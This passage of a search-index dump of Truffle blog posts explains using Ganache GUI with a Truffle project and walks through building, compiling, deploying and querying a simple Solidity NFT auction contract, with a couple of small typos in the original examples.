e.g \u201ctruffle migrate\u201d and \u201ctruffle test\u201d instead of just \"migrate\" and \"test\". Interacting with the smart contract deployed on Ganache GUI \u00b6 You can still interact with your deployed contract the same way we did in episode one, see the Interact with locally deployed contracts using Truffle CLI section for more information. The only difference would be the command we use in accessing the Truffle CLI\u2019s console. In episode one, we accessed the Truffle CLI\u2019s blockchain with the \u201ctruffle develop\u201d command and then retrieved our deployed contract. In this episode, since we no longer rely on the built-in Truffle CLI blockchain, we will use the command \u201ctruffle console\u201d to open up a console for fetching and interacting with the deployed contract instead. Note that the console exposed by the command \u201ctruffle console\u201d does not start any blockchain instance like \u201ctruffle develop\u201d does. Instead, it spins up an environment for running and interacting with the default blockchain you\u2019ve set in your truffle-config.js file. Feel free to try out all the code samples in the Interact with locally deployed contracts using Truffle CLI section of episode one in this new console. They should still work fine. Running automated tests against Ganache GUI \u00b6 In episode two, we wrote some unit tests which we ran against the built-in blockchain that comes with Truffle CLI, now since we\u2019re replacing that with the Ganache GUI, let's see how we can run our automated tests against Ganache GUI. Running our tests against Ganache GUI is as straightforward as running \u201ctruffle test\u201d on the root of our Truffle project. Since we have already updated the truffle-config.js file to point to the port on which Ganache GUI runs, every command that is prefixed with \u201ctruffle\u201d will automatically connect to and run on Ganache GUI. Benefits of using Ganache GUI over Truffle CLI\u2019s built-in blockchain \u00b6 One handy feature of Ganache GUI is the ability to create and maintain multiple workspaces, including the ability to link and unlink Truffle projects from these workspaces. Workspaces are particularly useful because they allow you to persist smart contract interaction history over time, including logs, events, transactions e.t.c Another useful feature of Ganache GUI is the number of available pages and views it has, each displaying a different type of information to help dapp developers gain more insight into their smart contracts. Some of these pages include: An accounts page that shows the accounts generated, their balances, the number of transactions that\u2019s been performed with said accounts, the account index, and the account\u2019s private key - if you click on the key icon on the right-hand side of each account, it will expose their private keys. This page is the default page and comes in handy when you need to double-check which account did what and how much ETH balance and transactions a particular account has performed. A blocks page that shows each block as mined on the blockchain, along with gas used and transactions. This is similar to what you\u2019d find on etherscan.io although with far fewer features. It is useful as it allows you to simulate a blockchain explorer. A transactions page that lists all transactions run against the blockchain. The transactions page together with the blocks page provides a lot of insight into your smart contract the same way a block explorer would. It also serves as a good resource in case you want to go back to previous transactions and learn more about them especially during debugging. The workspace feature makes it possible so that this information is persisted over time, something you can not get in the Truffle CLI\u2019s built-in blockchain. A contracts page that lists the contracts contained in your workspace's Truffle projects. Clicking on any of the listed contracts would open up a view that shows you all the values contained in your contract's storage including variables, their corresponding values, and the contract\u2019s available functions, address, and deployment transaction. An events page that lists all events that have been triggered since a workspace's creation. Ganache will attempt to decode events triggered by contracts in your Truffle project. A logs page that shows the logs for the server, which is useful for debugging. What\u2019s coming next? \u00b6 So far, we\u2019ve seen some ways in which adding Ganache GUI into our workflow makes building easier and provides more options for debugging and visibility. Up next, we\u2019ll explore ways you can debug your smart contract code, using the Truffle debugger and console.log feature. Until then, keep an eye on Truffle's Twitter and our GitHub Discussions page for more updates. We also hold weekly live-streamed sessions called Web3 Unleashed, where we build, interview developers in the web3 community, and discuss important developments across the ecosystem. You can find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "From Idea to Minimum Viable Dapp - How to use Ganache to enhance your auction dapp"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#what-is-ganache", "text": "Ganache is a local blockchain simulator that enables fast and easy dapp development, testing, and deployment on the Ethereum network. It enables developers to simulate the Ethereum virtual machine, allowing smart contracts to interact with it the same way they\u2019d interact with the Ethereum blockchain when deployed. This means that you can expect your smart contract to work on Ganache, the exact same way it would on the Ethereum testnets and mainnet. There are two flavors of Ganache, Ganache Command Line Interface (CLI) and Ganache Graphical User Interface (GUI) . Both flavors have a richer feature set than the built-in Ganache that comes with Truffle CLI, but for this post, we\u2019ll be focusing on Ganache GUI, exploring ways in which adding it to our mix of tools can greatly improve productivity. Suppose you\u2019re interested in using the Ganache CLI interface instead. In that case, you should check out this blog on Ganache 7 and this blog on three new features of Ganache CLI that will improve your development experience .", "title": "What is Ganache?"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#ganache-gui", "text": "Ganache GUI is a graphical version of the Ganache CLI, although not as feature-rich as Ganache CLI, it has some cool features that can help improve productivity, such as the ability to create and switch between multiple workspaces, link and unlink Truffle projects, examine blocks and transactions through the built-in block explorer and lots more. You can download a version of the Ganache GUI for your operating system by visiting the Ganache download page . Once you have that downloaded, go ahead and install it as you would any other application.", "title": "Ganache GUI"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#using-ganache-gui-instead-of-the-truffle-cli-built-in-blockchain", "text": "In episode one, under the Deploy contracts locally with Truffle CLI section, we deployed contracts to Truffle\u2019s built-in blockchain simulator and interacted with the deployed contract through the truffle developer console we exposed with the command \u201ctruffle develop\u201d. In episode two, after adding some automated unit tests, we ran our tests against the built-in blockchain that comes with Truffle CLI by first running \u201ctruffle develop\u201d followed by the \u201ctest\u201d command. Recall that running \u201ctruffle develop\u201d exposes an interface for accessing Truffle\u2019s built-in blockchain. In this post, we\u2019re going to be replacing Truffle\u2019s built-in blockchain with the Ganache GUI, since it provides more visibility and features compared to Truffle CLI\u2019s built-in blockchain. To do this successfully, we will need to set up a workspace for our project.", "title": "Using Ganache GUI instead of the Truffle CLI built-in blockchain"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#setting-up-a-workspace", "text": "On the Ganache GUI home screen, there are two options for creating a workspace, the QUICKSTART option, and the NEW WORKSPACE option. The QUICKSTART option helps spin up a blockchain with the default workspace configuration options in a single click, while the NEW WORKSPACE option allows for more flexibility in terms of configuration. Since we already have a working project with a truffle-config.js file, we\u2019ll be using the NEW WORKSPACE option. Click the NEW WORKSPACE button and enter a workspace name for your project, then go ahead and select your project\u2019s truffle-config.js file under the TRUFFLE PROJECTS input field and click SAVE WORKSPACE to continue. If you did that correctly, you should see an ACCOUNTS page. This page is similar to the response from running the \u201ctruffle develop\u201d command in episode one. It creates 10 free Ethereum accounts, each loaded with 100 fake ETH tokens for testing. This page also displays the Mnemonic seed phrase used for generating these accounts, as well as each account's private keys.", "title": "Setting up a workspace"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#replacing-truffle-clis-built-in-blockchain-with-ganache-gui", "text": "We will delve deeper into the other pages and what they do but in the meantime, let\u2019s go ahead and replace Truffle CLI\u2019s built-in blockchain with Ganache GUI in our dapp development workflow. Replacing Truffle CLI\u2019s built-in blockchain with Ganache GUI in our workflow means that contract deployments, interactions, and tests would run against this new blockchain simulator; Ganache GUI, and since it has a user interface, we will have more insight into what happens under the hood. To do this, all we need to do is to update the \u201cdevelopment.port\u201d value inside the truffle-config.js file to point to the port that our Ganache GUI instance exposes, which is usually port 7547. Notice that we currently have that value set to 8545, which is the port on which truffle CLI\u2019s internal blockchain runs - you can see this by running the \u201ctruffle develop\u201d command. Your truffle-config.js file should now look like this: ... development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" , // Any network (default: none) }, ... With the port value updated, we can now deploy our contract to Ganache GUI. To do that, navigate to the project root and run the command \u201ctruffle migrate\u201d. Recall that in previous episodes, to access a blockchain node, we had to first run the \u201ctruffle develop\u201d command to spin up Truffle\u2019s internal blockchain before running the actual commands like \u201cmigrate\u201d and \u201ctest\u201d. Now since we run a standalone Ganache GUI, we can skip the first command - \u201ctruffle develop\u201d entirely and run the actual commands directly. The only requirement is that we prefix all commands with the \u201ctruffle\u201d keyword e.g \u201ctruffle migrate\u201d and \u201ctruffle test\u201d instead of just \"migrate\" and \"test\".", "title": "Replacing Truffle CLI\u2019s built-in blockchain with Ganache GUI"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#interacting-with-the-smart-contract-deployed-on-ganache-gui", "text": "You can still interact with your deployed contract the same way we did in episode one, see the Interact with locally deployed contracts using Truffle CLI section for more information. The only difference would be the command we use in accessing the Truffle CLI\u2019s console. In episode one, we accessed the Truffle CLI\u2019s blockchain with the \u201ctruffle develop\u201d command and then retrieved our deployed contract. In this episode, since we no longer rely on the built-in Truffle CLI blockchain, we will use the command \u201ctruffle console\u201d to open up a console for fetching and interacting with the deployed contract instead. Note that the console exposed by the command \u201ctruffle console\u201d does not start any blockchain instance like \u201ctruffle develop\u201d does. Instead, it spins up an environment for running and interacting with the default blockchain you\u2019ve set in your truffle-config.js file. Feel free to try out all the code samples in the Interact with locally deployed contracts using Truffle CLI section of episode one in this new console. They should still work fine.", "title": "Interacting with the smart contract deployed on Ganache GUI"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#running-automated-tests-against-ganache-gui", "text": "In episode two, we wrote some unit tests which we ran against the built-in blockchain that comes with Truffle CLI, now since we\u2019re replacing that with the Ganache GUI, let's see how we can run our automated tests against Ganache GUI. Running our tests against Ganache GUI is as straightforward as running \u201ctruffle test\u201d on the root of our Truffle project. Since we have already updated the truffle-config.js file to point to the port on which Ganache GUI runs, every command that is prefixed with \u201ctruffle\u201d will automatically connect to and run on Ganache GUI.", "title": "Running automated tests against Ganache GUI"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#benefits-of-using-ganache-gui-over-truffle-clis-built-in-blockchain", "text": "One handy feature of Ganache GUI is the ability to create and maintain multiple workspaces, including the ability to link and unlink Truffle projects from these workspaces. Workspaces are particularly useful because they allow you to persist smart contract interaction history over time, including logs, events, transactions e.t.c Another useful feature of Ganache GUI is the number of available pages and views it has, each displaying a different type of information to help dapp developers gain more insight into their smart contracts. Some of these pages include: An accounts page that shows the accounts generated, their balances, the number of transactions that\u2019s been performed with said accounts, the account index, and the account\u2019s private key - if you click on the key icon on the right-hand side of each account, it will expose their private keys. This page is the default page and comes in handy when you need to double-check which account did what and how much ETH balance and transactions a particular account has performed. A blocks page that shows each block as mined on the blockchain, along with gas used and transactions. This is similar to what you\u2019d find on etherscan.io although with far fewer features. It is useful as it allows you to simulate a blockchain explorer. A transactions page that lists all transactions run against the blockchain. The transactions page together with the blocks page provides a lot of insight into your smart contract the same way a block explorer would. It also serves as a good resource in case you want to go back to previous transactions and learn more about them especially during debugging. The workspace feature makes it possible so that this information is persisted over time, something you can not get in the Truffle CLI\u2019s built-in blockchain. A contracts page that lists the contracts contained in your workspace's Truffle projects. Clicking on any of the listed contracts would open up a view that shows you all the values contained in your contract's storage including variables, their corresponding values, and the contract\u2019s available functions, address, and deployment transaction. An events page that lists all events that have been triggered since a workspace's creation. Ganache will attempt to decode events triggered by contracts in your Truffle project. A logs page that shows the logs for the server, which is useful for debugging.", "title": "Benefits of using Ganache GUI over Truffle CLI\u2019s built-in blockchain"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/#whats-coming-next", "text": "So far, we\u2019ve seen some ways in which adding Ganache GUI into our workflow makes building easier and provides more options for debugging and visibility. Up next, we\u2019ll explore ways you can debug your smart contract code, using the Truffle debugger and console.log feature. Until then, keep an eye on Truffle's Twitter and our GitHub Discussions page for more updates. We also hold weekly live-streamed sessions called Web3 Unleashed, where we build, interview developers in the web3 community, and discuss important developments across the ecosystem. You can find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "What\u2019s coming next?"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/", "text": "By Kingsley Arinze Every software engineer has a series of tools they default to when building applications from the ground up. In the traditional software industry, there are a lot of options for tooling to choose from that interoperate for end-to-end development. In Web3, an emergent industry, not as many tools are built with interoperability in mind. This is the problem Truffle solves for developers. Truffle simplifies the developer experience by creating tools and features within Truffle suite that are compatible with other tooling in Web3. This is the first part of a new Truffle content series, where we outline the steps to go from an idea to a minimum-viable-dapp, showcasing the cool features and tools available within Truffle suite for smart contract developers at any level of experience. In part one we\u2019ll be focusing on Truffle CLI and showcase all that is possible with the Truffle CLI by creating a smart contract project, writing smart contract code, compiling, migrating and interacting with this smart contract all within the Truffle CLI. In subsequent posts, we\u2019ll build on this project by adding automated testing, showcasing how easy it is to add smart contract testing in JavaScript/TypeScript and Solidity with Truffle. And later on, we\u2019ll also explore debugging options that are available to us via the Truffle debugger and console.log. By the end of this series, you will be able to build a dapp from the ground up, leveraging the various tools that are available in the Truffle suite of tools, including Ganache , Truffle for VS Code extension , Truffle dashboard , Truffle boxes and much more. Requirements \u00b6 To be able to follow through with the content of this post, you will need to have the following requirements met: Node.js v14 - v18 Windows, Linux, or macOS It is recommended that you download Node.js using a Node version manager to avoid permission errors caused by using sudo to download Truffle. Follow the instructions here to download a Node version manager for your operating system. With Node.js installed, you can install Truffle globally with the command npm install -g truffle . See the Truffle installation guide for more information. Create a Truffle project with Truffle Init \u00b6 To create a smart contract project with Truffle, there are two options to choose from, one is the Truffle box option, which we will touch on in more detail later in the series. The second option is the Truffle CLI option. For this post, we\u2019ll use the Truffle CLI option. By downloading Truffle globally, you have the Truffle CLI available to you. Create an empty folder for your project and call it daily-nft , then run truffle init in the root of this new folder. This should create a bare-bone Truffle project with no smart contract included. If you examine the newly created project structure, you\u2019ll find the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file The Smart contract \u00b6 For the smart contract, we\u2019ll be using this project built by my awesome colleague Josh . It\u2019s called the Daily NFT. The idea behind the project is that one NFT gets displayed every day, based on the winner of an auction. Users can continue bidding for the next day\u2019s NFT while the day\u2019s NFT is displayed. As you\u2019ll see, It\u2019s a simple project that is easy to understand, yet complex enough not to be a hello world or timer project. In the contracts/ directory, create a new Solidity file and call it Auction.sol , then add the following content to it: // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; contract Auction { event Start (); event Bid ( address indexed sender , uint amount ); event Withdraw ( address indexed bidder , uint amount ); event End ( address winner , uint amount ); address payable public seller ; uint public endAt ; bool public started ; bool public ended ; address public highestBidder ; uint public highestBid ; // Wei mapping ( address => uint ) public bids ; mapping ( address => address ) public nfts ; mapping ( address => uint256 ) public nftIds ; } A brief description of what happening in the code. We\u2019ve defined four events that would be triggered at four important stages of the contract; when we Start the auction - manually, when a Bid is made, when a Withdraw is triggered and, when the auction End s in 24 hours. We\u2019ve also defined a number of public variables as described below: seller : Payable address of the auction owner - the deploying address. endAt: Number of hours after which the auction ends - 24 hours. started: True or false value that signifies that the auction has start or not. ended: True or false value that signifies that the auction has ended or not. highestBidder: Address of the current highest bidder. highestBid: Highest bid amount expressed in Wei. bids: a mapping between addresses and their respective bid amounts nfts: a mapping between addresses and their respective bid nft address nftIds: a mapping between nft addresses and their respective Ids. ... constructor ( uint _startingBid ) { seller = payable ( msg.sender ); highestBid = _startingBid ; } function start () external { require ( ! started , \"started\" ); require ( msg.sender == seller , \"not seller\" ); started = true ; endAt = block.timestamp + 1 days ; emit Start (); } function bid () external payable { require ( started , \"not started\" ); require ( block.timestamp < endAt , \"ended\" ); require ( msg.value > highestBid , \"value < highest\" ); require ( nfts [ msg.sender ] != address ( 0 ), \"include nft to display\" ); if ( highestBidder != address ( 0 )) { bids [ highestBidder ] += highestBid ; } highestBidder = msg.sender ; highestBid = msg.value ; emit Bid ( msg.sender , msg.value ); } // Overload if the user submits an NFT function bid ( address nft , uint256 nftId ) external payable { require ( started , \"not started\" ); require ( block.timestamp < endAt , \"ended\" ); require ( msg.value > highestBid , \"value < highest\" ); if ( highestBidder != address ( 0 )) { bids [ highestBidder ] += highestBid ; } if ( nfts [ msg.sender ] == address ( 0 )) { require ( nft != address ( 0 ), \"invalid nft address\" ); nfts [ msg.sender ] = nft ; nftIds [ msg.sender ] = nftId ; } highestBidder = msg.sender ; highestBid = msg.value ; emit Bid ( msg.sender , msg.value ); } function withdraw () external { uint bal = bids [ msg.sender ]; bids [ msg.sender ] = 0 ; payable ( msg.sender ). transfer ( bal ); emit Withdraw ( msg.sender , bal ); } function end () external { require ( started , \"not started\" ); require ( block.timestamp >= endAt , \"end time in future\" ); require ( ! ended , \"ended\" ); ended = true ; emit End ( highestBidder , highestBid ); } Here\u2019s a summary of the second part of the contract code: constructor() function is called during deployment, setting the seller and highestBid to the deployer\u2019s address and the provided _startingBid respectively. start() function is manually called to start the auction. It sets the auction end time to 24 hours from start time. There are two bid() functions, one accepts an nft address and Id while the other does not accept any argument. They ensure that new bids are higher in value than the current highestBid for them to be accepted. withdraw() function allows users to claim back their bid amount. end() function checks that the auction end time has been reached before stopping the auction. Compile contracts with Truffle CLI \u00b6 To compile the newly created contract, navigate to the project root directory and run the truffle compile command. Truffle will go through the /contracts directory, compiling every file and library that ends with .sol. In our case, we only have one contract file to compile. Also note that upon first run, all contracts will be compiled but on subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. You can override this behavior by running the above command with the --all option. Upon successful compilation, notice that a new build directory has been created. This directory contains the artifacts of your compilation, specifically inside the build/contracts/ directory, relative to your project root. Go ahead and inspect the content of this directory. Deploy contracts locally with Truffle CLI \u00b6 Truffle ships with a built-in personal blockchain that can be used for interacting with, and testing smart contracts locally. This blockchain is local to your system and does not interact with the Ethereum main or test networks. To access it, simply run the command truffle develop . To be able to deploy contracts to any Ethereum network with Truffle, you must create a migration file for that contract. Migrations are JavaScript files, written with the assumption that your deployment needs will change with time, that help you deploy contracts to any Ethereum network, including locally running nodes like the one Truffle ships with. Now in the migrations/ folder, create a new file and call it 1_migration.js . The number \u201c1\u201d that precedes \u201c_migration\u201d is very important as it signifies order i.e It tells Truffle which migration file to run before the other. This number will be incremented with each new file that is added to the migration folder. Copy over the following content to the newly created migration file: const Auction = artifacts . require ( \"Auction\" ); module . exports = function ( deployer ) { deployer . deploy ( Auction , 100 ); }; Here, we\u2019re using the artifacts.require() function to tell Truffle which contract file we want to interact with. It returns a contract abstraction that we can use within the rest of our deployment script. On the second line, we now export a function that when called, takes a deployer object and calls on the deployer.deploy() function to deploy the contract, while passing in the required arguments specified in the Auction contract constructor. For a more detailed breakdown of how migrations work in Truffle, visit the Truffle migration documentation . With the migration file out of the way, we\u2019re ready to deploy the smart contract to the Truffle built-in local blockchain. Start by running the command truffle develop to expose the Truffle developer console - if you don't have it running already. Notice that it spins up a local blockchain on port 9545. This command also exposes 10 Ethereum accounts with there associated private keys and mnemonic seed phrase. Be sure not to send real Eth tokens to these addresses as they are not safe and are only meant for interacting with your smart contract. Within this console, run the command migrate to deploy your contract to the local blockchain node. This should return the transaction ID and address of your deployed contract, including a cost summary. Interact with locally deployed contracts using Truffle CLI \u00b6 With the contract deployed to Truffle\u2019s local blockchain and since we don\u2019t have a frontend for our dapp yet, we can manually interact with the deployed smart contract directly from the developer console exposed by the truffle develop command. Let's get to it! Fetch deployed contract: \u00b6 truffle(develop)> let auction = await Auction.deployed() Get the currently set seller and highestBid values \u00b6 truffle(develop)> let seller = await auction.seller() truffle(develop)> let highestBid = await auction.highestBid() Display seller and highestBid values, in my case: \u00b6 truffle(develop)> seller '0x1a33B6853b36F4c2E3872E229F3a77Bf75943F9d' truffle(develop)> highestBid.toNumber() 100 Check if the auction has started: \u00b6 truffle(develop)> let started = await auction.stared() truffle(develop)> started false Start the auction: \u00b6 truffle(develop)> await auction.start() truffle(develop)> started = await auction.started() true Whats next? \u00b6 You\u2019ve just successfully created a new Truffle project, written the smart contract, compiled and deployed the smart contract! We\u2019ve even gone ahead to interact with the deployed contract locally using the Truffle developer console. Congrats! In the next post, we\u2019ll explore writing and running automated tests for our smart contracts using the Truffle CLI. At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on our Github Discussions page . We also hold weekly live-streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "From Idea to Minimum Viable Dapp - Truffle Command Line Interface Part 1"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#requirements", "text": "To be able to follow through with the content of this post, you will need to have the following requirements met: Node.js v14 - v18 Windows, Linux, or macOS It is recommended that you download Node.js using a Node version manager to avoid permission errors caused by using sudo to download Truffle. Follow the instructions here to download a Node version manager for your operating system. With Node.js installed, you can install Truffle globally with the command npm install -g truffle . See the Truffle installation guide for more information.", "title": "Requirements"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#create-a-truffle-project-with-truffle-init", "text": "To create a smart contract project with Truffle, there are two options to choose from, one is the Truffle box option, which we will touch on in more detail later in the series. The second option is the Truffle CLI option. For this post, we\u2019ll use the Truffle CLI option. By downloading Truffle globally, you have the Truffle CLI available to you. Create an empty folder for your project and call it daily-nft , then run truffle init in the root of this new folder. This should create a bare-bone Truffle project with no smart contract included. If you examine the newly created project structure, you\u2019ll find the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file", "title": "Create a Truffle project with Truffle Init"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#the-smart-contract", "text": "For the smart contract, we\u2019ll be using this project built by my awesome colleague Josh . It\u2019s called the Daily NFT. The idea behind the project is that one NFT gets displayed every day, based on the winner of an auction. Users can continue bidding for the next day\u2019s NFT while the day\u2019s NFT is displayed. As you\u2019ll see, It\u2019s a simple project that is easy to understand, yet complex enough not to be a hello world or timer project. In the contracts/ directory, create a new Solidity file and call it Auction.sol , then add the following content to it: // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; contract Auction { event Start (); event Bid ( address indexed sender , uint amount ); event Withdraw ( address indexed bidder , uint amount ); event End ( address winner , uint amount ); address payable public seller ; uint public endAt ; bool public started ; bool public ended ; address public highestBidder ; uint public highestBid ; // Wei mapping ( address => uint ) public bids ; mapping ( address => address ) public nfts ; mapping ( address => uint256 ) public nftIds ; } A brief description of what happening in the code. We\u2019ve defined four events that would be triggered at four important stages of the contract; when we Start the auction - manually, when a Bid is made, when a Withdraw is triggered and, when the auction End s in 24 hours. We\u2019ve also defined a number of public variables as described below: seller : Payable address of the auction owner - the deploying address. endAt: Number of hours after which the auction ends - 24 hours. started: True or false value that signifies that the auction has start or not. ended: True or false value that signifies that the auction has ended or not. highestBidder: Address of the current highest bidder. highestBid: Highest bid amount expressed in Wei. bids: a mapping between addresses and their respective bid amounts nfts: a mapping between addresses and their respective bid nft address nftIds: a mapping between nft addresses and their respective Ids. ... constructor ( uint _startingBid ) { seller = payable ( msg.sender ); highestBid = _startingBid ; } function start () external { require ( ! started , \"started\" ); require ( msg.sender == seller , \"not seller\" ); started = true ; endAt = block.timestamp + 1 days ; emit Start (); } function bid () external payable { require ( started , \"not started\" ); require ( block.timestamp < endAt , \"ended\" ); require ( msg.value > highestBid , \"value < highest\" ); require ( nfts [ msg.sender ] != address ( 0 ), \"include nft to display\" ); if ( highestBidder != address ( 0 )) { bids [ highestBidder ] += highestBid ; } highestBidder = msg.sender ; highestBid = msg.value ; emit Bid ( msg.sender , msg.value ); } // Overload if the user submits an NFT function bid ( address nft , uint256 nftId ) external payable { require ( started , \"not started\" ); require ( block.timestamp < endAt , \"ended\" ); require ( msg.value > highestBid , \"value < highest\" ); if ( highestBidder != address ( 0 )) { bids [ highestBidder ] += highestBid ; } if ( nfts [ msg.sender ] == address ( 0 )) { require ( nft != address ( 0 ), \"invalid nft address\" ); nfts [ msg.sender ] = nft ; nftIds [ msg.sender ] = nftId ; } highestBidder = msg.sender ; highestBid = msg.value ; emit Bid ( msg.sender , msg.value ); } function withdraw () external { uint bal = bids [ msg.sender ]; bids [ msg.sender ] = 0 ; payable ( msg.sender ). transfer ( bal ); emit Withdraw ( msg.sender , bal ); } function end () external { require ( started , \"not started\" ); require ( block.timestamp >= endAt , \"end time in future\" ); require ( ! ended , \"ended\" ); ended = true ; emit End ( highestBidder , highestBid ); } Here\u2019s a summary of the second part of the contract code: constructor() function is called during deployment, setting the seller and highestBid to the deployer\u2019s address and the provided _startingBid respectively. start() function is manually called to start the auction. It sets the auction end time to 24 hours from start time. There are two bid() functions, one accepts an nft address and Id while the other does not accept any argument. They ensure that new bids are higher in value than the current highestBid for them to be accepted. withdraw() function allows users to claim back their bid amount. end() function checks that the auction end time has been reached before stopping the auction.", "title": "The Smart contract"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#compile-contracts-with-truffle-cli", "text": "To compile the newly created contract, navigate to the project root directory and run the truffle compile command. Truffle will go through the /contracts directory, compiling every file and library that ends with .sol. In our case, we only have one contract file to compile. Also note that upon first run, all contracts will be compiled but on subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. You can override this behavior by running the above command with the --all option. Upon successful compilation, notice that a new build directory has been created. This directory contains the artifacts of your compilation, specifically inside the build/contracts/ directory, relative to your project root. Go ahead and inspect the content of this directory.", "title": "Compile contracts with Truffle CLI"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#deploy-contracts-locally-with-truffle-cli", "text": "Truffle ships with a built-in personal blockchain that can be used for interacting with, and testing smart contracts locally. This blockchain is local to your system and does not interact with the Ethereum main or test networks. To access it, simply run the command truffle develop . To be able to deploy contracts to any Ethereum network with Truffle, you must create a migration file for that contract. Migrations are JavaScript files, written with the assumption that your deployment needs will change with time, that help you deploy contracts to any Ethereum network, including locally running nodes like the one Truffle ships with. Now in the migrations/ folder, create a new file and call it 1_migration.js . The number \u201c1\u201d that precedes \u201c_migration\u201d is very important as it signifies order i.e It tells Truffle which migration file to run before the other. This number will be incremented with each new file that is added to the migration folder. Copy over the following content to the newly created migration file: const Auction = artifacts . require ( \"Auction\" ); module . exports = function ( deployer ) { deployer . deploy ( Auction , 100 ); }; Here, we\u2019re using the artifacts.require() function to tell Truffle which contract file we want to interact with. It returns a contract abstraction that we can use within the rest of our deployment script. On the second line, we now export a function that when called, takes a deployer object and calls on the deployer.deploy() function to deploy the contract, while passing in the required arguments specified in the Auction contract constructor. For a more detailed breakdown of how migrations work in Truffle, visit the Truffle migration documentation . With the migration file out of the way, we\u2019re ready to deploy the smart contract to the Truffle built-in local blockchain. Start by running the command truffle develop to expose the Truffle developer console - if you don't have it running already. Notice that it spins up a local blockchain on port 9545. This command also exposes 10 Ethereum accounts with there associated private keys and mnemonic seed phrase. Be sure not to send real Eth tokens to these addresses as they are not safe and are only meant for interacting with your smart contract. Within this console, run the command migrate to deploy your contract to the local blockchain node. This should return the transaction ID and address of your deployed contract, including a cost summary.", "title": "Deploy contracts locally with Truffle CLI"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#interact-with-locally-deployed-contracts-using-truffle-cli", "text": "With the contract deployed to Truffle\u2019s local blockchain and since we don\u2019t have a frontend for our dapp yet, we can manually interact with the deployed smart contract directly from the developer console exposed by the truffle develop command. Let's get to it!", "title": "Interact with locally deployed contracts using Truffle CLI"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#fetch-deployed-contract", "text": "truffle(develop)> let auction = await Auction.deployed()", "title": "Fetch deployed contract:"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#get-the-currently-set-seller-and-highestbid-values", "text": "truffle(develop)> let seller = await auction.seller() truffle(develop)> let highestBid = await auction.highestBid()", "title": "Get the currently set seller and highestBid values"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#display-seller-and-highestbid-values-in-my-case", "text": "truffle(develop)> seller '0x1a33B6853b36F4c2E3872E229F3a77Bf75943F9d' truffle(develop)> highestBid.toNumber() 100", "title": "Display seller and highestBid values, in my case:"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#check-if-the-auction-has-started", "text": "truffle(develop)> let started = await auction.stared() truffle(develop)> started false", "title": "Check if the auction has started:"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#start-the-auction", "text": "truffle(develop)> await auction.start() truffle(develop)> started = await auction.started() true", "title": "Start the auction:"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-1/#whats-next", "text": "You\u2019ve just successfully created a new Truffle project, written the smart contract, compiled and deployed the smart contract! We\u2019ve even gone ahead to interact with the deployed contract locally using the Truffle developer console. Congrats! In the next post, we\u2019ll explore writing and running automated tests for our smart contracts using the Truffle CLI. At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on our Github Discussions page . We also hold weekly live-streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Whats next?"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-2/", "text": "By Kingsley Arinze In the first part of From Idea to Minimum Viable Dapp series, we created a new smart contract project, wrote some smart contract code, compiled and deployed the smart contract, and interacted with the deployed contract, all while using the Truffle CLI. In this episode, we\u2019ll explore writing and running automated unit tests for smart contracts, leveraging the cool features that Truffle CLI provides developers. To be able to follow through with this guide, you should start by checking out part one as it is a prerequisite for this post. Truffle comes bundled with an automated testing framework to make testing your contracts easy. 